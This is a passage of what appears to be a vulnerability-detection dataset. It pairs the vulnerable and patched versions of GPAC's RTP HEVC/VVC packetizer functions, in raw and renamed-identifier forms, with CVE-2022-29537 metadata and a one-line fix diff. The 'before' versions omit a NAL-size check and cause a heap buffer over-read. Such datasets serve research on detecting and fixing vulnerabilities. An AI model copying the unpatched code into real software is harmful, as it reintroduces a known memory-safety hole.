else if (VAR_0->bytesInPacket + VAR_2 + 4 >= VAR_0->Path_MTU) VAR_5 = 2; 
else if (! (VAR_0->flags & VAR_8) ) VAR_5 = 2;
if (VAR_0->bytesInPacket && VAR_5) {
VAR_0->rtp_header.Marker = (VAR_5==1) ? 1 : 0;
if (strlen(VAR_0->hevc_payload_hdr)) {
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_0->hevc_payload_hdr, 2, VAR_9);
memset(VAR_0->hevc_payload_hdr, 0, 2);
}
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
}
if (!VAR_1) return VAR_10;
if (!VAR_0->bytesInPacket) {
VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
VAR_0->rtp_header.SequenceNumber += 1;
VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
}
if (VAR_0->bytesInPacket+VAR_2+4 < VAR_0->Path_MTU) {
Bool VAR_11 = (VAR_0->flags & VAR_8) ? VAR_9 : VAR_12;
if (VAR_3 && !VAR_0->bytesInPacket) VAR_11 = VAR_12;
if (VAR_11) {
char VAR_13[2];
if (!VAR_0->bytesInPacket) {
VAR_0->hevc_payload_hdr[0] = VAR_1[0];
VAR_0->hevc_payload_hdr[1] = (VAR_14 << 3) | (VAR_1[1] & 0x7);
}
else {
u8 VAR_15, VAR_16, VAR_17, VAR_18;
VAR_0->hevc_payload_hdr[0] |= (VAR_1[0] & 0x80);
VAR_15 = (VAR_0->hevc_payload_hdr[0] & 0x3F);
VAR_17 = (VAR_1[0] & 0x3F);
if (VAR_15 > VAR_17) {
VAR_0->hevc_payload_hdr[0] = (VAR_0->hevc_payload_hdr[0] & 0xC0) | VAR_17;
}
VAR_16 = VAR_0->hevc_payload_hdr[1] & 0x3;
VAR_18 = VAR_1[1] & 0x3;
if (VAR_16 > VAR_18) {
VAR_0->hevc_payload_hdr[1] = (VAR_0->hevc_payload_hdr[1] & 0xF8) | VAR_18;
}
}
VAR_13[0] = VAR_2>>8;
VAR_13[1] = VAR_2&0x00ff;
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_13, 2, VAR_12);
VAR_0->bytesInPacket += 2;
}
if (VAR_0->OnDataReference)
VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_2, 0);
else
VAR_0->OnData(VAR_0->cbk_obj, VAR_1, VAR_2, VAR_12);
VAR_0->bytesInPacket += VAR_2;
if (VAR_3) {
VAR_0->rtp_header.Marker = 1;
if (strlen(VAR_0->hevc_payload_hdr)) {
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_0->hevc_payload_hdr, 2, VAR_9);
memset(VAR_0->hevc_payload_hdr, 0, 2);
}
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
}
}
else {
u32 VAR_19;
u8 VAR_20[2];
u8 VAR_21;
assert(VAR_2 + 4 >=VAR_0->Path_MTU);
assert(!VAR_0->bytesInPacket);
VAR_6 = VAR_2 - 2;
VAR_19 = 2;
while (VAR_6) {
u8 VAR_22;
if (3 + VAR_6 > VAR_0->Path_MTU) {
VAR_7 = VAR_0->Path_MTU - 3;
} else {
VAR_7 = VAR_6;
}
memset(VAR_20, 0, 2);
VAR_20[0] = VAR_1[0];
VAR_20[1] = (((u32) VAR_23) << 3) | (VAR_1[1] & 0x7);
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_20, 2, VAR_12);
VAR_22 = VAR_1[1] >> 3;
VAR_21 = 0;
VAR_21 |= VAR_22;
if (VAR_19==2) VAR_21 |= 0x80;
else if (VAR_7 == VAR_6) {
VAR_21 |= 0x40;
if (VAR_22 <= VAR_24) {
VAR_21 |= 0x20;
}
}
VAR_0->OnData(VAR_0->cbk_obj, &VAR_21, 1, VAR_12);
if (VAR_0->OnDataReference)
VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_7, VAR_19);
else
VAR_0->OnData(VAR_0->cbk_obj, VAR_1+VAR_19, VAR_7, VAR_12);
VAR_19 += VAR_7;
VAR_6 -= VAR_7;
VAR_0->rtp_header.Marker = (VAR_3 && !VAR_6) ? 1 : 0;
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
if (VAR_6) {
VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
VAR_0->rtp_header.SequenceNumber += 1;
VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
}
}
}
return VAR_10;
}",gpac/1773b7a34bc08734aee7d3f5dfe65d06389fe15a/rtp_pck_mpeg4.c/vul/before/0.json,"GF_Err gp_rtp_builder_do_vvc(GP_RTPPacketizer *builder, u8 *nalu, u32 nalu_size, u8 IsAUEnd, u32 FullAUSize)
{
	u32 do_flush, bytesLeft, size;

	do_flush = 0;
	if (!nalu) do_flush = 1;
	else if (builder->sl_header.accessUnitStartFlag) do_flush = 1;
	/*we must NOT fragment a NALU*/
	else if (builder->bytesInPacket + nalu_size + 4 >= builder->Path_MTU) do_flush = 2; //2 bytes PayloadHdr for AP + 2 bytes NAL size
	/*aggregation is disabled*/
	else if (! (builder->flags & GP_RTP_PCK_USE_MULTI) ) do_flush = 2;

	if (builder->bytesInPacket && do_flush) {
		builder->rtp_header.Marker = (do_flush==1) ? 1 : 0;
		/*insert payload_hdr in case of AP*/
		if (strlen(builder->hevc_payload_hdr)) {
			builder->OnData(builder->cbk_obj, (char *)builder->hevc_payload_hdr, 2, GF_TRUE);
			memset(builder->hevc_payload_hdr, 0, 2);
		}
		builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
		builder->bytesInPacket = 0;
	}

	if (!nalu) return GF_OK;
	if (nalu_size<2) return GF_NON_COMPLIANT_BITSTREAM;

	/*need a new RTP packet*/
	if (!builder->bytesInPacket) {
		builder->rtp_header.PayloadType = builder->PayloadType;
		builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
		builder->rtp_header.SequenceNumber += 1;
		builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
	}

	/*at this point we're sure the NALU fits in current packet OR must be splitted*/
	/*check that we should use single NALU packet mode or aggreation packets mode*/
	if (builder->bytesInPacket+nalu_size+4 < builder->Path_MTU) {
		Bool use_AP = (builder->flags & GP_RTP_PCK_USE_MULTI) ? GF_TRUE : GF_FALSE;
		/*if this is the AU end and no NALU in packet, go for single NALU packet mode*/
		if (IsAUEnd && !builder->bytesInPacket) use_AP = GF_FALSE;

		if (use_AP) {
			char nal_s[2];
			/*declare PayloadHdr for AP*/
			if (!builder->bytesInPacket) {
				//copy everything, reassign type (byte 1 bits 8-3)
				builder->hevc_payload_hdr[0] = nalu[0];
				builder->hevc_payload_hdr[1] = (RTP_VVC_AGG_NAL << 3) | (nalu[1] & 0x7);
			}
			else {
				/*F bit of AP is 0 if the F bit of each aggreated NALU is 0; otherwise its must be 1*/
				/*LayerId and TID must be the lowest value of LayerId and TID of all aggreated NALU*/
				u8 cur_LayerId, cur_TID, new_LayerId, new_TID;

				builder->hevc_payload_hdr[0] |= (nalu[0] & 0x80);
				cur_LayerId = (builder->hevc_payload_hdr[0] & 0x3F);
				new_LayerId = (nalu[0] & 0x3F);
				if (cur_LayerId > new_LayerId) {
					builder->hevc_payload_hdr[0] = (builder->hevc_payload_hdr[0] & 0xC0) | new_LayerId;
				}
				cur_TID = builder->hevc_payload_hdr[1] & 0x3;
				new_TID = nalu[1] & 0x3;
				if (cur_TID > new_TID) {
					builder->hevc_payload_hdr[1] = (builder->hevc_payload_hdr[1] & 0xF8) | new_TID;
				}
			}

			/*add NALU size*/
			nal_s[0] = nalu_size>>8;
			nal_s[1] = nalu_size&0x00ff;
			builder->OnData(builder->cbk_obj, (char *)nal_s, 2, GF_FALSE);
			builder->bytesInPacket += 2;
		}
		/*add data*/
		if (builder->OnDataReference)
			builder->OnDataReference(builder->cbk_obj, nalu_size, 0);
		else
			builder->OnData(builder->cbk_obj, nalu, nalu_size, GF_FALSE);

		builder->bytesInPacket += nalu_size;

		if (IsAUEnd) {
			builder->rtp_header.Marker = 1;
			if (strlen(builder->hevc_payload_hdr)) {
				builder->OnData(builder->cbk_obj, (char *)builder->hevc_payload_hdr, 2, GF_TRUE);
				memset(builder->hevc_payload_hdr, 0, 2);
			}
			builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
			builder->bytesInPacket = 0;
		}
	}
	/*fragmentation unit*/
	else {
		u32 offset;
		u8 payload_hdr[2];
		u8 shdr;

		assert(nalu_size + 4 >=builder->Path_MTU);
		assert(!builder->bytesInPacket);

		/*FU payload doesn't have the NAL hdr (2 bytes*/
		bytesLeft = nalu_size - 2;
		offset = 2;
		while (bytesLeft) {
			u8 nut;

			if (3 + bytesLeft > builder->Path_MTU) {
				size = builder->Path_MTU - 3;
			} else {
				size = bytesLeft;
			}

			/*declare PayloadHdr for FU*/
			memset(payload_hdr, 0, 2);
			/*copy everything and assign type*/
			payload_hdr[0] = nalu[0];
			payload_hdr[1] = (((u32) RTP_VVC_FRAG_NAL) << 3) | (nalu[1] & 0x7);
			builder->OnData(builder->cbk_obj, (char *)payload_hdr, 2, GF_FALSE);

			nut = nalu[1] >> 3;
			/*declare FU header*/
			shdr = 0;
			/*assign type*/
			shdr |= nut;
			/*start bit*/
			if (offset==2) shdr |= 0x80;
			/*end bit*/
			else if (size == bytesLeft) {
				shdr |= 0x40;
				//VCL, last packet of picture, set P bit
				if (nut <= GF_VVC_NALU_SLICE_GDR) {
					shdr |= 0x20;
				}
			}

			builder->OnData(builder->cbk_obj, &shdr, 1, GF_FALSE);

			/*add data*/
			if (builder->OnDataReference)
				builder->OnDataReference(builder->cbk_obj, size, offset);
			else
				builder->OnData(builder->cbk_obj, nalu+offset, size, GF_FALSE);

			offset += size;
			bytesLeft -= size;

			/*flush no matter what (FUs cannot be agreggated)*/
			builder->rtp_header.Marker = (IsAUEnd && !bytesLeft) ? 1 : 0;
			builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
			builder->bytesInPacket = 0;

			if (bytesLeft) {
				builder->rtp_header.PayloadType = builder->PayloadType;
				builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
				builder->rtp_header.SequenceNumber += 1;
				builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
			}
		}
	}
	return GF_OK;
}","GF_Err gp_rtp_builder_do_vvc(GP_RTPPacketizer *VAR_0, u8 *VAR_1, u32 VAR_2, u8 VAR_3, u32 VAR_4)
{
	u32 VAR_5, VAR_6, VAR_7;

	VAR_5 = 0;
	if (!VAR_1) VAR_5 = 1;
	else if (VAR_0->sl_header.accessUnitStartFlag) VAR_5 = 1;
	/* COMMENT_0 */
	else if (VAR_0->bytesInPacket + VAR_2 + 4 >= VAR_0->Path_MTU) VAR_5 = 2; /* COMMENT_1 */
	/* COMMENT_2 */
	else if (! (VAR_0->flags & VAR_8) ) VAR_5 = 2;

	if (VAR_0->bytesInPacket && VAR_5) {
		VAR_0->rtp_header.Marker = (VAR_5==1) ? 1 : 0;
		/* COMMENT_3 */
		if (strlen(VAR_0->hevc_payload_hdr)) {
			VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_0->hevc_payload_hdr, 2, VAR_9);
			memset(VAR_0->hevc_payload_hdr, 0, 2);
		}
		VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
		VAR_0->bytesInPacket = 0;
	}

	if (!VAR_1) return VAR_10;
	if (VAR_2<2) return VAR_11;

	/* COMMENT_4 */
	if (!VAR_0->bytesInPacket) {
		VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
		VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
		VAR_0->rtp_header.SequenceNumber += 1;
		VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
	}

	/* COMMENT_5 */
	/* COMMENT_6 */
	if (VAR_0->bytesInPacket+VAR_2+4 < VAR_0->Path_MTU) {
		Bool VAR_12 = (VAR_0->flags & VAR_8) ? VAR_9 : VAR_13;
		/* COMMENT_7 */
		if (VAR_3 && !VAR_0->bytesInPacket) VAR_12 = VAR_13;

		if (VAR_12) {
			char VAR_14[2];
			/* COMMENT_8 */
			if (!VAR_0->bytesInPacket) {
				/* COMMENT_9 */
				VAR_0->hevc_payload_hdr[0] = VAR_1[0];
				VAR_0->hevc_payload_hdr[1] = (VAR_15 << 3) | (VAR_1[1] & 0x7);
			}
			else {
				/* COMMENT_10 */
				/* COMMENT_11 */
				u8 VAR_16, VAR_17, VAR_18, VAR_19;

				VAR_0->hevc_payload_hdr[0] |= (VAR_1[0] & 0x80);
				VAR_16 = (VAR_0->hevc_payload_hdr[0] & 0x3F);
				VAR_18 = (VAR_1[0] & 0x3F);
				if (VAR_16 > VAR_18) {
					VAR_0->hevc_payload_hdr[0] = (VAR_0->hevc_payload_hdr[0] & 0xC0) | VAR_18;
				}
				VAR_17 = VAR_0->hevc_payload_hdr[1] & 0x3;
				VAR_19 = VAR_1[1] & 0x3;
				if (VAR_17 > VAR_19) {
					VAR_0->hevc_payload_hdr[1] = (VAR_0->hevc_payload_hdr[1] & 0xF8) | VAR_19;
				}
			}

			/* COMMENT_12 */
			VAR_14[0] = VAR_2>>8;
			VAR_14[1] = VAR_2&0x00ff;
			VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_14, 2, VAR_13);
			VAR_0->bytesInPacket += 2;
		}
		/* COMMENT_13 */
		if (VAR_0->OnDataReference)
			VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_2, 0);
		else
			VAR_0->OnData(VAR_0->cbk_obj, VAR_1, VAR_2, VAR_13);

		VAR_0->bytesInPacket += VAR_2;

		if (VAR_3) {
			VAR_0->rtp_header.Marker = 1;
			if (strlen(VAR_0->hevc_payload_hdr)) {
				VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_0->hevc_payload_hdr, 2, VAR_9);
				memset(VAR_0->hevc_payload_hdr, 0, 2);
			}
			VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
			VAR_0->bytesInPacket = 0;
		}
	}
	/* COMMENT_14 */
	else {
		u32 VAR_20;
		u8 VAR_21[2];
		u8 VAR_22;

		assert(VAR_2 + 4 >=VAR_0->Path_MTU);
		assert(!VAR_0->bytesInPacket);

		/* COMMENT_15 */
		VAR_6 = VAR_2 - 2;
		VAR_20 = 2;
		while (VAR_6) {
			u8 VAR_23;

			if (3 + VAR_6 > VAR_0->Path_MTU) {
				VAR_7 = VAR_0->Path_MTU - 3;
			} else {
				VAR_7 = VAR_6;
			}

			/* COMMENT_16 */
			memset(VAR_21, 0, 2);
			/* COMMENT_17 */
			VAR_21[0] = VAR_1[0];
			VAR_21[1] = (((u32) VAR_24) << 3) | (VAR_1[1] & 0x7);
			VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_21, 2, VAR_13);

			VAR_23 = VAR_1[1] >> 3;
			/* COMMENT_18 */
			VAR_22 = 0;
			/* COMMENT_19 */
			VAR_22 |= VAR_23;
			/* COMMENT_20 */
			if (VAR_20==2) VAR_22 |= 0x80;
			/* COMMENT_21 */
			else if (VAR_7 == VAR_6) {
				VAR_22 |= 0x40;
				/* COMMENT_22 */
				if (VAR_23 <= VAR_25) {
					VAR_22 |= 0x20;
				}
			}

			VAR_0->OnData(VAR_0->cbk_obj, &VAR_22, 1, VAR_13);

			/* COMMENT_13 */
			if (VAR_0->OnDataReference)
				VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_7, VAR_20);
			else
				VAR_0->OnData(VAR_0->cbk_obj, VAR_1+VAR_20, VAR_7, VAR_13);

			VAR_20 += VAR_7;
			VAR_6 -= VAR_7;

			/* COMMENT_23 */
			VAR_0->rtp_header.Marker = (VAR_3 && !VAR_6) ? 1 : 0;
			VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
			VAR_0->bytesInPacket = 0;

			if (VAR_6) {
				VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
				VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
				VAR_0->rtp_header.SequenceNumber += 1;
				VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
			}
		}
	}
	return VAR_10;
}",gpac/1773b7a34bc08734aee7d3f5dfe65d06389fe15a/rtp_pck_mpeg4.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -22,6 +22,7 @@
 	}
 
 	if (!nalu) return GF_OK;
+	if (nalu_size<2) return GF_NON_COMPLIANT_BITSTREAM;
 
 	/*need a new RTP packet*/
 	if (!builder->bytesInPacket) {","{'deleted_lines': [], 'added_lines': ['\tif (nalu_size<2) return GF_NON_COMPLIANT_BITSTREAM;']}",True,"gp_rtp_builder_do_hevc in ietf/rtp_pck_mpeg4.c in GPAC 2.0.0 has a heap-based buffer over-read, as demonstrated by MP4Box.",5.5,MEDIUM,1,valid,2022-04-19T07:08:45Z,4
CVE-2022-29537,['CWE-125'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #2173,1773b7a34bc08734aee7d3f5dfe65d06389fe15a,https://github.com/gpac/gpac/commit/1773b7a34bc08734aee7d3f5dfe65d06389fe15a,src/ietf/rtp_pck_mpeg4.c,gp_rtp_builder_do_hevc,"GF_Err gp_rtp_builder_do_hevc(GP_RTPPacketizer *builder, u8 *nalu, u32 nalu_size, u8 IsAUEnd, u32 FullAUSize)
{
u32 do_flush, bytesLeft, size;
do_flush = 0;
if (!nalu) do_flush = 1;
else if (builder->sl_header.accessUnitStartFlag) do_flush = 1;
else if (builder->bytesInPacket + nalu_size + 4 >= builder->Path_MTU) do_flush = 2; 
else if (! (builder->flags & GP_RTP_PCK_USE_MULTI) ) do_flush = 2;
if (builder->bytesInPacket && do_flush) {
builder->rtp_header.Marker = (do_flush==1) ? 1 : 0;
if (strlen(builder->hevc_payload_hdr)) {
builder->OnData(builder->cbk_obj, (char *)builder->hevc_payload_hdr, 2, GF_TRUE);
memset(builder->hevc_payload_hdr, 0, 2);
}
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
}
if (!nalu) return GF_OK;
if (!builder->bytesInPacket) {
builder->rtp_header.PayloadType = builder->PayloadType;
builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
builder->rtp_header.SequenceNumber += 1;
builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
}
if (builder->bytesInPacket+nalu_size+4 < builder->Path_MTU) {
Bool use_AP = (builder->flags & GP_RTP_PCK_USE_MULTI) ? GF_TRUE : GF_FALSE;
if (IsAUEnd && !builder->bytesInPacket) use_AP = GF_FALSE;
if (use_AP) {
char nal_s[2];
if (!builder->bytesInPacket) {
builder->hevc_payload_hdr[0] = (nalu[0] & 0x81) | (48 << 1);
builder->hevc_payload_hdr[1] = nalu[1];
}
else {
u8 cur_LayerId, cur_TID, new_LayerId, new_TID;
builder->hevc_payload_hdr[0] |= (nalu[0] & 0x80);
cur_LayerId = ((builder->hevc_payload_hdr[0] & 0x01) << 5) + ((builder->hevc_payload_hdr[1] & 0xF8) >> 3);
new_LayerId = ((nalu[0] & 0x01) << 5) + ((nalu[1] & 0xF8) >> 3);
if (cur_LayerId > new_LayerId) {
builder->hevc_payload_hdr[0] = (builder->hevc_payload_hdr[0] & 0xFE) | (nalu[0] & 0x01);
builder->hevc_payload_hdr[1] = (builder->hevc_payload_hdr[1] & 0x07) | (nalu[1] & 0xF8);
}
cur_TID = builder->hevc_payload_hdr[1] & 0x07;
new_TID = nalu[1] & 0x07;
if (cur_TID > new_TID) {
builder->hevc_payload_hdr[1] = (builder->hevc_payload_hdr[1] & 0xF8) | (nalu[1] & 0x07);
}
}
nal_s[0] = nalu_size>>8;
nal_s[1] = nalu_size&0x00ff;
builder->OnData(builder->cbk_obj, (char *)nal_s, 2, GF_FALSE);
builder->bytesInPacket += 2;
}
if (builder->OnDataReference)
builder->OnDataReference(builder->cbk_obj, nalu_size, 0);
else
builder->OnData(builder->cbk_obj, nalu, nalu_size, GF_FALSE);
builder->bytesInPacket += nalu_size;
if (IsAUEnd) {
builder->rtp_header.Marker = 1;
if (strlen(builder->hevc_payload_hdr)) {
builder->OnData(builder->cbk_obj, (char *)builder->hevc_payload_hdr, 2, GF_TRUE);
memset(builder->hevc_payload_hdr, 0, 2);
}
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
}
}
else {
u32 offset;
char payload_hdr[2];
char shdr;
assert(nalu_size + 4 >=builder->Path_MTU);
assert(!builder->bytesInPacket);
bytesLeft = nalu_size - 2;
offset = 2;
while (bytesLeft) {
if (3 + bytesLeft > builder->Path_MTU) {
size = builder->Path_MTU - 3;
} else {
size = bytesLeft;
}
memset(payload_hdr, 0, 2);
payload_hdr[0] = (nalu[0] & 0x81) | (49 << 1);
payload_hdr[1] = nalu[1];
builder->OnData(builder->cbk_obj, (char *)payload_hdr, 2, GF_FALSE);
shdr = 0;
shdr |= (nalu[0] & 0x7E) >> 1;
if (offset==2) shdr |= 0x80;
else if (size == bytesLeft) shdr |= 0x40;
builder->OnData(builder->cbk_obj, &shdr, 1, GF_FALSE);
if (builder->OnDataReference)
builder->OnDataReference(builder->cbk_obj, size, offset);
else
builder->OnData(builder->cbk_obj, nalu+offset, size, GF_FALSE);
offset += size;
bytesLeft -= size;
builder->rtp_header.Marker = (IsAUEnd && !bytesLeft) ? 1 : 0;
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
if (bytesLeft) {
builder->rtp_header.PayloadType = builder->PayloadType;
builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
builder->rtp_header.SequenceNumber += 1;
builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
}
}
}
return GF_OK;
}","GF_Err gp_rtp_builder_do_hevc(GP_RTPPacketizer *VAR_0, u8 *VAR_1, u32 VAR_2, u8 VAR_3, u32 VAR_4)
{
u32 VAR_5, VAR_6, VAR_7;
VAR_5 = 0;
if (!VAR_1) VAR_5 = 1;
else if (VAR_0->sl_header.accessUnitStartFlag) VAR_5 = 1;
else if (VAR_0->bytesInPacket + VAR_2 + 4 >= VAR_0->Path_MTU) VAR_5 = 2; 
else if (! (VAR_0->flags & VAR_8) ) VAR_5 = 2;
if (VAR_0->bytesInPacket && VAR_5) {
VAR_0->rtp_header.Marker = (VAR_5==1) ? 1 : 0;
if (strlen(VAR_0->hevc_payload_hdr)) {
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_0->hevc_payload_hdr, 2, VAR_9);
memset(VAR_0->hevc_payload_hdr, 0, 2);
}
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
}
if (!VAR_1) return VAR_10;
if (!VAR_0->bytesInPacket) {
VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
VAR_0->rtp_header.SequenceNumber += 1;
VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
}
if (VAR_0->bytesInPacket+VAR_2+4 < VAR_0->Path_MTU) {
Bool VAR_11 = (VAR_0->flags & VAR_8) ? VAR_9 : VAR_12;
if (VAR_3 && !VAR_0->bytesInPacket) VAR_11 = VAR_12;
if (VAR_11) {
char VAR_13[2];
if (!VAR_0->bytesInPacket) {
VAR_0->hevc_payload_hdr[0] = (VAR_1[0] & 0x81) | (48 << 1);
VAR_0->hevc_payload_hdr[1] = VAR_1[1];
}
else {
u8 VAR_14, VAR_15, VAR_16, VAR_17;
VAR_0->hevc_payload_hdr[0] |= (VAR_1[0] & 0x80);
VAR_14 = ((VAR_0->hevc_payload_hdr[0] & 0x01) << 5) + ((VAR_0->hevc_payload_hdr[1] & 0xF8) >> 3);
VAR_16 = ((VAR_1[0] & 0x01) << 5) + ((VAR_1[1] & 0xF8) >> 3);
if (VAR_14 > VAR_16) {
VAR_0->hevc_payload_hdr[0] = (VAR_0->hevc_payload_hdr[0] & 0xFE) | (VAR_1[0] & 0x01);
VAR_0->hevc_payload_hdr[1] = (VAR_0->hevc_payload_hdr[1] & 0x07) | (VAR_1[1] & 0xF8);
}
VAR_15 = VAR_0->hevc_payload_hdr[1] & 0x07;
VAR_17 = VAR_1[1] & 0x07;
if (VAR_15 > VAR_17) {
VAR_0->hevc_payload_hdr[1] = (VAR_0->hevc_payload_hdr[1] & 0xF8) | (VAR_1[1] & 0x07);
}
}
VAR_13[0] = VAR_2>>8;
VAR_13[1] = VAR_2&0x00ff;
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_13, 2, VAR_12);
VAR_0->bytesInPacket += 2;
}
if (VAR_0->OnDataReference)
VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_2, 0);
else
VAR_0->OnData(VAR_0->cbk_obj, VAR_1, VAR_2, VAR_12);
VAR_0->bytesInPacket += VAR_2;
if (VAR_3) {
VAR_0->rtp_header.Marker = 1;
if (strlen(VAR_0->hevc_payload_hdr)) {
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_0->hevc_payload_hdr, 2, VAR_9);
memset(VAR_0->hevc_payload_hdr, 0, 2);
}
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
}
}
else {
u32 VAR_18;
char VAR_19[2];
char VAR_20;
assert(VAR_2 + 4 >=VAR_0->Path_MTU);
assert(!VAR_0->bytesInPacket);
VAR_6 = VAR_2 - 2;
VAR_18 = 2;
while (VAR_6) {
if (3 + VAR_6 > VAR_0->Path_MTU) {
VAR_7 = VAR_0->Path_MTU - 3;
} else {
VAR_7 = VAR_6;
}
memset(VAR_19, 0, 2);
VAR_19[0] = (VAR_1[0] & 0x81) | (49 << 1);
VAR_19[1] = VAR_1[1];
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_19, 2, VAR_12);
VAR_20 = 0;
VAR_20 |= (VAR_1[0] & 0x7E) >> 1;
if (VAR_18==2) VAR_20 |= 0x80;
else if (VAR_7 == VAR_6) VAR_20 |= 0x40;
VAR_0->OnData(VAR_0->cbk_obj, &VAR_20, 1, VAR_12);
if (VAR_0->OnDataReference)
VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_7, VAR_18);
else
VAR_0->OnData(VAR_0->cbk_obj, VAR_1+VAR_18, VAR_7, VAR_12);
VAR_18 += VAR_7;
VAR_6 -= VAR_7;
VAR_0->rtp_header.Marker = (VAR_3 && !VAR_6) ? 1 : 0;
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
if (VAR_6) {
VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
VAR_0->rtp_header.SequenceNumber += 1;
VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
}
}
}
return VAR_10;
}",gpac/1773b7a34bc08734aee7d3f5dfe65d06389fe15a/rtp_pck_mpeg4.c/vul/before/1.json,"GF_Err gp_rtp_builder_do_hevc(GP_RTPPacketizer *builder, u8 *nalu, u32 nalu_size, u8 IsAUEnd, u32 FullAUSize)
{
	u32 do_flush, bytesLeft, size;

	do_flush = 0;
	if (!nalu) do_flush = 1;
	else if (builder->sl_header.accessUnitStartFlag) do_flush = 1;
	/*we must NOT fragment a NALU*/
	else if (builder->bytesInPacket + nalu_size + 4 >= builder->Path_MTU) do_flush = 2; //2 bytes PayloadHdr for AP + 2 bytes NAL size
	/*aggregation is disabled*/
	else if (! (builder->flags & GP_RTP_PCK_USE_MULTI) ) do_flush = 2;

	if (builder->bytesInPacket && do_flush) {
		builder->rtp_header.Marker = (do_flush==1) ? 1 : 0;
		/*insert payload_hdr in case of AP*/
		if (strlen(builder->hevc_payload_hdr)) {
			builder->OnData(builder->cbk_obj, (char *)builder->hevc_payload_hdr, 2, GF_TRUE);
			memset(builder->hevc_payload_hdr, 0, 2);
		}
		builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
		builder->bytesInPacket = 0;
	}

	if (!nalu) return GF_OK;
	if (nalu_size<2) return GF_NON_COMPLIANT_BITSTREAM;

	/*need a new RTP packet*/
	if (!builder->bytesInPacket) {
		builder->rtp_header.PayloadType = builder->PayloadType;
		builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
		builder->rtp_header.SequenceNumber += 1;
		builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
	}

	/*at this point we're sure the NALU fits in current packet OR must be splitted*/
	/*check that we should use single NALU packet mode or aggreation packets mode*/
	if (builder->bytesInPacket+nalu_size+4 < builder->Path_MTU) {
		Bool use_AP = (builder->flags & GP_RTP_PCK_USE_MULTI) ? GF_TRUE : GF_FALSE;
		/*if this is the AU end and no NALU in packet, go for single NALU packet mode*/
		if (IsAUEnd && !builder->bytesInPacket) use_AP = GF_FALSE;

		if (use_AP) {
			char nal_s[2];
			/*declare PayloadHdr for AP*/
			if (!builder->bytesInPacket) {
				/*copy F bit and assign type*/
				builder->hevc_payload_hdr[0] = (nalu[0] & 0x81) | (48 << 1);
				/*copy LayerId and TID*/
				builder->hevc_payload_hdr[1] = nalu[1];
			}
			else {
